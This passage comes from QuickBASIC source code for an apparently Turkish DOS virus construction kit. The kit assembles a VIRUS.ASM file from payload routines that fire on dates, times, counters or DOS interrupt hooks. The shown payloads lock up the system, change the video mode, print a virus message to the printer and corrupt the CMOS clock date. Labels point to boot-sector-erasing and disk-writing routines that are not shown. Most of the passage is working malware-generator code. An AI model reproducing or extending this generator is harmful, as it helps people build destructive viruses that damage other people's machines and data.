  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))

  PRINT #1, "          cli"
  PRINT #1, "SysLck:   mov cx,0ffffh"
  PRINT #1, "          loop SysLck"

  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  SistemKilitleGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  SistemKilitleAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  SistemKilitleYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  SistemKilitleSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  SistemKilitleDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  SistemKilitleSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + SistemKilitleGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + SistemKilitleAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + SistemKilitleYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + SistemKilitleSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + SistemKilitleDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
 END IF
END IF

END SUB

SUB FuncVideoModu (IslemKodu)

ActionName$ = "VideoModu"
ActionCode = 14

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz HarddiskYazLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla

  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))

  PRINT #1, "          mov al,00"
  PRINT #1, "          out 70h,al"
  PRINT #1, "          in al,71h"
  PRINT #1, "          and al,07h"
  PRINT #1, "          mov ah,00"
  PRINT #1, "          int 10h"

  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  VideoModuGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  VideoModuAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  VideoModuYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  VideoModuSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  VideoModuDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  VideoModuSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + VideoModuGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + VideoModuAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + VideoModuYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + VideoModuSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + VideoModuDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
 END IF
END IF

END SUB

SUB FuncYaziciyaYaz (IslemKodu)

ActionName$ = "YaziciyaYaz"
ActionCode = 12

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz KlavyeLedleriLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla

  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))

  PRINT #1, "          push ds"
  PRINT #1, "          push es"
  PRINT #1, "          call HataSakla"
  PRINT #1, "          pop es"
  PRINT #1, "          pop ds"
  PRINT #1, "          mov ch,00"
  PRINT #1, "          mov byte ptr cl,cs:[LenVirusMsgPrint]"
  PRINT #1, "          push cs"
  PRINT #1, "          pop ds"
  PRINT #1, "          mov di,offset cs:[VirusMsgPrint]"
  PRINT #1, "          mov ah,05h"
  PRINT #1, "          mov dl,13"
  PRINT #1, "          int 21h"
  PRINT #1, "VrsMsg:   mov ah,05h"
  PRINT #1, "          mov byte ptr dl,ds:[di]"
  PRINT #1, "          int 21h"
  PRINT #1, "          inc di"
  PRINT #1, "          loop VrsMsg"
  PRINT #1, "          mov ah,05h"
  PRINT #1, "          mov dl,13"
  PRINT #1, "          int 21h"
  PRINT #1, "          mov ah,05h"
  PRINT #1, "          mov dl,12"
  PRINT #1, "          int 21h"
  PRINT #1, "          call HataYaz"

  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  YaziciyaYazGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  YaziciyaYazAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  YaziciyaYazYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  YaziciyaYazSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  YaziciyaYazDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  YaziciyaYazSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + YaziciyaYazGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + YaziciyaYazAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + YaziciyaYazYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + YaziciyaYazSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + YaziciyaYazDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
   PRINT #1, "VirusMsgPrint db '" + VirusMsgPrint$ + "',13,10,'$'"
   PRINT #1, "LenVirusMsgPrint db " + RTRIM$(STR$(LEN(VirusMsgPrint$)))
 END IF
END IF

END SUB

SUB FuncZamanDegistir (IslemKodu)

ActionName$ = "ZamanDegistir"
ActionCode = 3

IF IslemKodu = FonksiyonKontrol THEN
     PRINT #1, ActionName$ + "Label:"
 IF FuncTick(ActionCode) <> 0 THEN
      CALL JumpYaz(ActionCode)
      PRINT #1, "          jnz BootSilLabel"
      PRINT #1, "          call " + ActionName$
 END IF
END IF


IF IslemKodu = AnaKoduYaz THEN
  PRINT #1, ";................................."
  PRINT #1, ActionName$ + ":"
 IF FuncTick(ActionCode) <> 0 THEN
  CALL RegisterSakla

  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 OR INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 OR INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN CALL TarihYaz(ActionName$)
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 OR INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN CALL SaatYaz(ActionName$)
  IF INT(FuncCounter(ActionCode)) <> 0 THEN CALL SayacYaz(ActionName$, FuncCounter(ActionCode))

  PRINT #1, "          mov al,07h"
  PRINT #1, "          out 70h,al"
  PRINT #1, "          in al,71h"
  PRINT #1, "          mov ah,al"
  PRINT #1, "          inc ah"
  PRINT #1, "          mov al,07h"
  PRINT #1, "          out 70h,al"
  PRINT #1, "          mov al,ah"
  PRINT #1, "          out 71h,al"
  PRINT #1, "          mov al,08h"
  PRINT #1, "          out 70h,al"
  PRINT #1, "          in al,71h"
  PRINT #1, "          mov ah,al"
  PRINT #1, "          inc ah"
  PRINT #1, "          mov al,08h"
  PRINT #1, "          out 70h,al"
  PRINT #1, "          mov al,ah"
  PRINT #1, "          out 71h,al"
  PRINT #1, "          mov al,09h"
  PRINT #1, "          out 70h,al"
  PRINT #1, "          in al,71h"
  PRINT #1, "          mov ah,al"
  PRINT #1, "          inc ah"
  PRINT #1, "          mov al,09h"
  PRINT #1, "          out 70h,al"
  PRINT #1, "          mov al,ah"
  PRINT #1, "          out 71h,al"

  CALL RegisterYaz(ActionName$)
 END IF
END IF


IF IslemKodu = DegiskenYaz THEN
 IF FuncTick(ActionCode) <> 0 THEN
  ZamanDegistirGun$ = STR$(INT(VAL(LEFT$(FuncDate$(ActionCode), 2))))
  ZamanDegistirAy$ = STR$(INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))))
  ZamanDegistirYil$ = STR$(INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))))
  ZamanDegistirSaat$ = STR$(INT(VAL(LEFT$(FuncTime$(ActionCode), 2))))
  ZamanDegistirDakika$ = STR$(INT(VAL(MID$(FuncTime$(ActionCode), 4, 2))))
  ZamanDegistirSayac = INT(FuncCounter(ActionCode))
  IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihGun    db " + ZamanDegistirGun$ + "h"
  END IF
  IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihAy     db " + ZamanDegistirAy$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
   PRINT #1, ActionName$ + "TarihYil    dw " + ZamanDegistirYil$ + "h"
  END IF
  IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanSaat   db " + ZamanDegistirSaat$ + "h"
  END IF
  IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
   PRINT #1, ActionName$ + "ZamanDakika db " + ZamanDegistirDakika$ + "h"
  END IF
  IF INT(FuncCounter(ActionCode)) <> 0 THEN
   PRINT #1, ActionName$ + "Sayac       dw 0000"
  END IF
 END IF
END IF

END SUB

SUB GununZamani (GunTarih$, GunSaat$)

GunTarihGun$ = MID$(DATE$, 4, 2)
GunTarihAy$ = LEFT$(DATE$, 2)
GunTarihYil$ = RIGHT$(DATE$, 4)
GunTarih$ = GunTarihGun$ + "/" + GunTarihAy$ + "/" + GunTarihYil$

GunSaatSaat$ = LEFT$(TIME$, 2)
GunSaatDakika$ = MID$(TIME$, 4, 2)
GunSaatSaniye$ = RIGHT$(TIME$, 2)
GunSaat$ = GunSaatSaat$ + ":" + GunSaatDakika$ + ":" + GunSaatSaniye$

END SUB

SUB HataRutin

BEEP
LOCATE 1, 1, 0
PCOPY 0, 1

IF HataDurumKodu = 1 THEN
 LOCATE 1, 1, 1
 COLOR 15, 0
 CLS
END IF

satir = 0: sutun = 0: zemin = 0

IF HataDurumKodu = 0 THEN
 satir = 9: sutun = 9
 COLOR 4, zemin
 LOCATE satir, sutun: PRINT "…ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ HATA ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª"
 FOR i = 2 TO 5: COLOR 4, zemin: LOCATE (satir - 1) + i, sutun: PRINT "∫"; : COLOR 3, zemin: PRINT STRING$(61, " "); : COLOR 4, zemin: PRINT "∫"; : COLOR 0, 0: PRINT "€€"
 NEXT i
 LOCATE satir + 5, sutun: COLOR 4, zemin: PRINT "»ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº"; : COLOR 0, 0: PRINT "€€"
 COLOR 0, 0: LOCATE satir + 6, sutun + 2: PRINT STRING$(63, "€")
END IF

COLOR 15, zemin
LOCATE satir + 1, sutun + 2: PRINT "Hata oldu !"
LOCATE satir + 2, sutun + 2: PRINT "Hata kodu:"; : COLOR 11, zemin: PRINT ERR
COLOR 15, zemin: LOCATE satir + 3, sutun + 2: PRINT "Hata.....: "; : COLOR 11, zemin

SELECT CASE ERR
      
       CASE 6
	PRINT "Taüma oldu!."

       CASE 7
	PRINT "Bellek taümasç !."

       CASE 11
	PRINT "Sçfçra bîlme !."

       CASE 13
	PRINT "Tip uyumsuzlußu !."

       CASE 14
	PRINT "Bellek yetersiz !."

       CASE 17
	PRINT "òüleme devam edilemiyor !."

       CASE 21
	PRINT "Derleyicide tançmlanmamçü hata !."

       CASE 24
	PRINT "Aygçt yançt vermiyor !."

       CASE 25
	PRINT "Aygçt áalçümçyor veya yok !."

       CASE 27
	PRINT "Yazçcçda kaßçt bitti !."

       CASE 51
	PRINT "Derleyici hatasç !."

       CASE 52
	PRINT "Yanlçü dosya numarasç veya adç !."

       CASE 53
	PRINT "Dosya bulunamadç !."

       CASE 54
	PRINT "Dosya modu hatalç !."

       CASE 55
	PRINT "Dosya halen kullançmda !."

       CASE 57
	PRINT "Araá Giriü/Äçkçü hatasç !."

       CASE 58
	PRINT "Dosya zaten mevcut !."

       CASE 61
	PRINT "Disk dolu !."

       CASE 63
	PRINT "Kayçt numarasç hatalç !."

       CASE 64
	PRINT "Dosya ismi hatalç !."

       CASE 67
	PRINT "Äok fazla dosya aáçk !."
      
       CASE 68
	PRINT "Aygçt kullançlamçyor !."

       CASE 69
	PRINT "KomÅnikasyon arabelleßi taütç !."
      
       CASE 70
	PRINT "Eriüim rededildi !."
       
       CASE 71
	PRINT "Disk hazçr deßil !."

       CASE 72
	PRINT "Disk bozuk !."

       CASE 74
	PRINT "Ad deßiüim hatasç !."

       CASE 75
	PRINT "Eriüim/Koruma hatasç !."

       CASE 76
	PRINT "Yol bulunamadç !."

END SELECT

LOCATE satir + 4, sutun + 2, 1: COLOR 11, zemin: PRINT "Devam iáin bir tuüa basçn.";
k$ = INPUT$(1)
LOCATE 1, 1, 0
PCOPY 1, 0
zeminArka = 3
zemin = 1
LogoColor = 11
satir = 3: sutun = 3

END SUB

SUB Hiz
again:
 t = TIMER
 WHILE TIMER = t
 SysSpeed = SysSpeed + 1
 WEND
IF bossay = 0 THEN bossay = 1: SysSpeed = 0: GOTO again
END SUB

SUB Intro

satir = 9: sutun = 3
COLOR 0, zeminArka: CLS

COLOR 15, zemin
LOCATE satir, sutun, 0: PRINT "…ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª"
FOR i = satir + 1 TO satir + 7: COLOR 15, zemin: LOCATE i, sutun: PRINT "∫"; : COLOR 3, zemin: PRINT STRING$(73, " "); : COLOR 15, zemin: PRINT "∫"; : COLOR 0, 0: PRINT "€€"
NEXT i
LOCATE satir + 8, sutun: COLOR 15, zemin: PRINT "»ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº"; : COLOR 0, 0: PRINT "€€"
COLOR 0, 0: LOCATE satir + 9, sutun + 2: PRINT STRING$(75, "€")
COLOR LogoColor, zemin: LOCATE satir + 1, sutun + 70: PRINT CHR$(250); CHR$(251); CHR$(252)
COLOR LogoColor, zemin: LOCATE satir + 2, sutun + 70: PRINT CHR$(253); CHR$(254); CHR$(255)
LOCATE satir + 3, sutun + 31: COLOR 15, zemin: PRINT program$
LOCATE satir + 4, sutun + 28: COLOR 11, zemin: PRINT "VirÅs öretim Yazçlçmç"
LOCATE satir + 5, sutun + 36: COLOR 11, zemin: PRINT Yil$
LOCATE satir + 1, sutun + 55: COLOR 15, zemin: PRINT yazar$
LOCATE satir + 1, sutun + 2: COLOR 15, zemin: PRINT ""
k$ = INPUT$(1)
IF k$ = CHR$(27) THEN CALL ProgramSonu

END SUB

SUB JumpYaz (FuncCode)

   SELECT CASE FuncTick(FuncCode)
     CASE 1
      PRINT #1, "          cmp ah,4bh"

     CASE 2
      PRINT #1, "          cmp ah,ah"

     CASE 3
      PRINT #1, "          cmp ah,2ah"

     CASE 4
      PRINT #1, "          cmp ah,2ch"


   END SELECT

END SUB

SUB LoadFont (CharSet$(), HowMany, Where)
  Regs.ax = &H1100
  Regs.bx = &H1000
  Regs.cx = HowMany
  Regs.dx = Where
  Regs.es = VARSEG(CharSet$(0))
  Regs.bp = SADD(CharSet$(0))
  CALL INTERRUPTX(&H10, Regs, Regs)
END SUB

SUB OrijinalFont
  Regs.ax = &H1130
  Regs.bx = &H600
  CALL INTERRUPTX(&H10, Regs, Regs)
  segment = Regs.es
  Pointer = Regs.bp
  DEF SEG = segment
  FOR i = 0 TO 4095
   MID$(CharSet$(0), i + 1, 1) = CHR$(PEEK(Pointer + i))
  NEXT
  DEF SEG
  CALL LoadFont(CharSet$(), 256, 0)
END SUB

SUB ProgramHazirla

True = 1: False = 0: FonksiyonKontrol = 1: AnaKoduYaz = 2: DegiskenYaz = 3
VirusFile$ = "VIRUS.ASM": VirusFileCom$ = "VIRUS"
PgUp$ = CHR$(0) + CHR$(73): PgDn$ = CHR$(0) + CHR$(81): Enter$ = CHR$(13)
Up$ = CHR$(0) + CHR$(72): Down$ = CHR$(0) + CHR$(80)
LFT$ = CHR$(0) + CHR$(75): RGT$ = CHR$(0) + CHR$(77): Tab$ = CHR$(9)
ESC$ = CHR$(27): Bs$ = CHR$(8): F1$ = CHR$(0) + CHR$(59): F2$ = CHR$(0) + CHR$(60)
F10$ = CHR$(0) + CHR$(68): F8$ = CHR$(0) + CHR$(66)
Str = 5: Stn = 5

LogoColor = 11
zeminArka = 3
zemin = 1

FOR i = 1 TO 15
 READ FuncName$(i), FuncDate$(i), FuncTime$(i), FuncCounter(i), FuncTick(i)
NEXT i

FOR i = 1 TO 126: READ Yardim$(i): NEXT

HowMany = 256: Where = 0: CharSet$(0) = SPACE$(4096)

Yil$ = CHR$(48 + 1) + CHR$(56 + 1) + CHR$(56 + 1) + CHR$(56 + 1)
program$ = CHR$(85 + 1) + CHR$(72 + 1) + CHR$(81 + 1) + CHR$(84 + 1) + CHR$(82 + 1) + CHR$(31 + 1) + CHR$(75 + 1) + CHR$(64 + 1) + CHR$(65 + 1) + CHR$(78 + 1) + CHR$(81 + 1) + CHR$(64 + 1) + CHR$(83 + 1) + CHR$(78 + 1) + CHR$(81 + 1) + CHR$(88 + 1)
yazar$ = CHR$(82 + 1) + CHR$(128 + 1) + CHR$(107 + 1) + CHR$(100 + 1) + CHR$(120 + 1) + CHR$(108 + 1) + CHR$(96 + 1) + CHR$(109 + 1) + CHR$(31 + 1) + CHR$(70 + 1) + CHR$(153 + 1) + CHR$(77 + 1) + CHR$(68 + 1) + CHR$(75 + 1)

CALL EkranKartiTest
CALL TurkceFont
CALL Hiz
CALL GununZamani(GunTarih$, GunSaat$)
CALL Intro
CALL Warning

END SUB

SUB ProgramSonu
 COLOR 7, 0
 CLS
 CALL OrijinalFont
 END
END SUB

SUB Rapor (Im, Kd)

STATIC SaklaTetik

IF Im = 0 AND Kd = 0 THEN GOTO EkraniGeriKoy

IF SaklaTetik = 0 THEN
 LOCATE 1, 1, 0
 PCOPY 0, 1
 SaklaTetik = 1
END IF

Yapilan$ = FuncName$(Im)
AltYapilan$ = ""
IF Kd = 1 THEN AltYapilan$ = "Jump rutini"

IF FuncSign(Im) <> 0 AND Kd = 2 THEN
 AltYapilan$ = "Aktivite kodu"
ELSE
 IF Kd = 2 THEN AltYapilan$ = "Ana kod etiketi"
END IF

IF FuncSign(Im) <> 0 AND Kd = 3 THEN
 AltYapilan$ = "Deßiükenler"
ELSE
 IF Kd = 3 THEN AltYapilan$ = "Äçkçü etiketi"
END IF

 IF Im = 20 THEN Yapilan$ = "VirÅsÅn standart bîlÅmleri."

 satir = 9: sutun = 9
 COLOR 15, zemin
 LOCATE satir, sutun: PRINT "…ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ VòRöS YAZILIYOR ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª"
 FOR i = 2 TO 3: COLOR 15, zemin: LOCATE (satir - 1) + i, sutun: PRINT "∫"; : COLOR 3, zemin: PRINT STRING$(61, " "); : COLOR 15, zemin: PRINT "∫"; : COLOR 0, 0: PRINT "€€"
 NEXT i
 LOCATE satir + 3, sutun: COLOR 15, zemin: PRINT "»ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº"; : COLOR 0, 0: PRINT "€€"
 COLOR 0, 0: LOCATE satir + 4, sutun + 2: PRINT STRING$(63, "€")

 COLOR 15, zemin
 LOCATE satir + 1, sutun + 2: COLOR 15, zemin: PRINT Yapilan$
 LOCATE satir + 2, sutun + 2: COLOR 15, zemin: PRINT AltYapilan$

EkraniGeriKoy:
IF Im = 0 AND Kd = 0 THEN
 satir = 9: sutun = 9
 LOCATE satir + 1, sutun + 2: COLOR 15, zemin: PRINT "VirÅsÅn yazçmç tamamlandç."
 LOCATE satir + 2, sutun + 2: COLOR 15, zemin: PRINT "VirÅs derlenmeye hazçr   "; : COLOR 7, zemin: PRINT "(F10:Otomatik derleme). "
 k$ = INPUT$(1)
 LOCATE 1, 1, 0
 PCOPY 1, 0
 SaklaTetik = 0
END IF

END SUB

SUB RegisterSakla

PRINT #1, "          push ax"
PRINT #1, "          push bx"
PRINT #1, "          push cx"
PRINT #1, "          push dx"
PRINT #1, "          push si"
PRINT #1, "          push di"
PRINT #1, "          push bp"
PRINT #1, "          push es"
PRINT #1, "          push ds"

END SUB

SUB RegisterYaz (ActionName$)

PRINT #1, ActionName$ + "Exit:"
PRINT #1, "          pop ds"
PRINT #1, "          pop es"
PRINT #1, "          pop bp"
PRINT #1, "          pop di"
PRINT #1, "          pop si"
PRINT #1, "          pop dx"
PRINT #1, "          pop cx"
PRINT #1, "          pop bx"
PRINT #1, "          pop ax"
PRINT #1, "          ret"

END SUB

SUB SaatYaz (ActionName$)

PRINT #1, "          mov al,02"
PRINT #1, "          out 70h,al"
PRINT #1, "          in al,71h"
PRINT #1, "          mov cl,al"
PRINT #1, "          mov al,04"
PRINT #1, "          out 70h,al"
PRINT #1, "          in al,71h"
PRINT #1, "          mov ch,al"

IF INT(VAL(LEFT$(FuncTime$(ActionCode), 2))) <> 0 THEN
 PRINT #1, "          cmp byte ptr ch,cs:[" + ActionName$ + "ZamanSaat]"
 PRINT #1, "          jz " + ActionName$ + "Cont4"
 PRINT #1, "          jmp " + ActionName$ + "Exit"
 PRINT #1, ActionName$ + "Cont4:"
END IF

IF INT(VAL(RIGHT$(FuncTime$(ActionCode), 2))) <> 0 THEN
 PRINT #1, "          cmp byte ptr cl,cs:[" + ActionName$ + "ZamanDakika]"
 PRINT #1, "          jz " + ActionName$ + "Cont5"
 PRINT #1, "          jmp " + ActionName$ + "Exit"
 PRINT #1, ActionName$ + "Cont5:"
END IF

END SUB

SUB SayacYaz (ActionName$, FuncSayac)

PRINT #1, "          inc cs:[" + ActionName$ + "Sayac]"
PRINT #1, "          cmp word ptr cs:[" + ActionName$ + "Sayac]," + LTRIM$(STR$(FuncSayac))
PRINT #1, "          jz " + ActionName$ + "Cont6"
PRINT #1, "          jmp " + ActionName$ + "Exit"
PRINT #1, ActionName$ + "Cont6:"
PRINT #1, "          mov word ptr cs:[" + ActionName$ + "Sayac],0000"
END SUB

SUB TarihYaz (ActionName$)

PRINT #1, "          mov al,07"
PRINT #1, "          out 70h,al"
PRINT #1, "          in al,71h"
PRINT #1, "          mov bh,al"
PRINT #1, "          mov al,08"
PRINT #1, "          out 70h,al"
PRINT #1, "          in al,71h"
PRINT #1, "          mov bl,al"
PRINT #1, "          mov al,09"
PRINT #1, "          out 70h,al"
PRINT #1, "          in al,71h"
PRINT #1, "          mov cl,al"
PRINT #1, "          mov al,50"
PRINT #1, "          out 70h,al"
PRINT #1, "          in al,71h"
PRINT #1, "          mov ch,al"
 
IF INT(VAL(LEFT$(FuncDate$(ActionCode), 2))) <> 0 THEN
 PRINT #1, "          cmp byte ptr bh,cs:[" + ActionName$ + "TarihGun]"
 PRINT #1, "          jz " + ActionName$ + "Cont1"
 PRINT #1, "          jmp " + ActionName$ + "Exit"
 PRINT #1, ActionName$ + "Cont1:"
END IF

IF INT(VAL(MID$(FuncDate$(ActionCode), 4, 2))) <> 0 THEN
 PRINT #1, "          cmp byte ptr bl,cs:[" + ActionName$ + "TarihAy]"
 PRINT #1, "          jz " + ActionName$ + "Cont2"
 PRINT #1, "          jmp " + ActionName$ + "Exit"
 PRINT #1, ActionName$ + "Cont2:"
END IF

IF INT(VAL(RIGHT$(FuncDate$(ActionCode), 4))) <> 0 THEN
 PRINT #1, "          cmp word ptr cx,cs:[" + ActionName$ + "TarihYil]"
 PRINT #1, "          jz " + ActionName$ + "Cont3"
 PRINT #1, "          jmp " + ActionName$ + "Exit"
 PRINT #1, ActionName$ + "Cont3:"
END IF

END SUB

SUB TextAl (Degisken$, Sat, Sut, Boy, TextRenk, ZeminRenk)

Degisken$ = Degisken$ + SPACE$(Boy - LEN(Degisken$))
COLOR 15, zemin
x = 1
LOCATE Sat, Sut: PRINT Degisken$
LOCATE Sat, Sut + x - 1, 1, 7, 7

TusTextAl:
k$ = INKEY$
IF k$ = "" THEN GOTO TusTextAl
IF k$ = Enter$ OR k$ = Tab$ OR k$ = ESC$ THEN GOTO Tamam
IF k$ = LFT$ THEN GOTO Sol
IF k$ = RGT$ THEN GOTO Sag
IF k$ = Bs$ THEN GOTO Geri
IF ASC(LEFT$(k$, 1)) = 0 THEN SOUND 3500, .2: GOTO TusTextAl
IF LEFT$(k$, 1) < CHR$(32) AND RIGHT$(k$, 1) < CHR$(32) THEN SOUND 3500, .2: GOTO TusTextAl

NORMAL:
  MID$(Degisken$, x, 1) = k$
  x = x + 1: IF x > Boy THEN x = Boy
   LOCATE Sat, Sut: PRINT Degisken$
   LOCATE Sat, Sut + x - 1, 1
GOTO TusTextAl

Geri:
IF x < 2 THEN SOUND 3500, .2: GOTO TusTextAl
IF x = 2 THEN D1$ = "": GOTO GC
D1$ = LEFT$(Degisken$, x - 2)
GC:
  D2$ = MID$(Degisken$, x)
  Degisken$ = D1$ + D2$: Degisken$ = Degisken$ + SPACE$(Boy - LEN(Degisken$))
